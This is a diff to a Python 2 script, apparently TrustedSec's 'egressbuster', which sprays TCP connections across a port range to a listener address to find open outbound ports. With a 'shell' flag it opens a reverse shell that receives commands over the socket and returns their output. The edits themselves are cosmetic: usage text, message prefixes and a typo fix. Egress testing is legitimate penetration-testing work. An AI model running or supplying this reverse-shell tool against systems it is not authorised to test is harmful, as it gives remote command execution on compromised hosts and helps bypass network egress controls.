@@ -33,16 +33,16 @@ Quick egress buster reverse shell
 Written by: Dave Kennedy (ReL1K) (@HackingDave)
 A TrustedSec Project
 
-NOTE: Supports all 65536 ports.
+NOTE: Supports all 65536 TCP ports.
 
 Usage:
 
 Note that the last option is optional. If you want a shell to spawn when a port
 is detected, simply type shell as an optional flag.
 
-egressbuster.exe <listener_ip_address> <lowport-highport> <optional_flag_shell>
+Usage: $ egressbuster.py <listener_ip_address> <lowport-highport> <optional_flag_shell>
 
-example: egressbuster.exe 10.9.5.2 1-65536 shell
+Example: $ egressbuster.py 10.9.5.2 1-65536 shell
         """
     sys.exit()
 
@@ -56,7 +56,7 @@ except:
 base_port = int(lowport) - 1
 end_port = int(highport)
 
-print "Sending packets to egress listener..."
+print "[i] Sending packets to egress listener..."
 
 
 def start_socket(ipaddr, base_port, shell):
@@ -65,11 +65,11 @@ def start_socket(ipaddr, base_port, shell):
         sockobj = socket(AF_INET, SOCK_STREAM)
         sockobj.connect((ipaddr, base_port))
         sockobj.send(str(base_port))
-        sockobj.send('[*] Connection Established!')
+        sockobj.send('')
         if shell == "shell":
             # start loop
             while 1:
-                # recieve shell command
+                # receive shell command
                 data = sockobj.recv(1024)
                 # if its quit, then break out and close socket
                 if data == "quit": break
@@ -99,11 +99,11 @@ def start_socket(ipaddr, base_port, shell):
                 sockobj.send(stdout_value)
             # close socket
             sockobj.close()
-            sys.exit()
 
     # if we throw an error
     finally:
-        print "test"
+        print "[i] Connection made to %s on port: %s" % (ipaddr, base_port)
+        sys.exit()
 
 
 # except Exception,e :
@@ -112,12 +112,12 @@ def start_socket(ipaddr, base_port, shell):
 #       pass
 
 while 1:
-    base_port = base_port + 1
+    base_port += 1
     thread.start_new_thread(start_socket, (ipaddr, base_port, shell))
     time.sleep(0.01)
     if base_port == end_port:
         break
 
-print "All packets have been sent"
+print "[i] All packets have been sent"
 while 1:
     time.sleep(50)
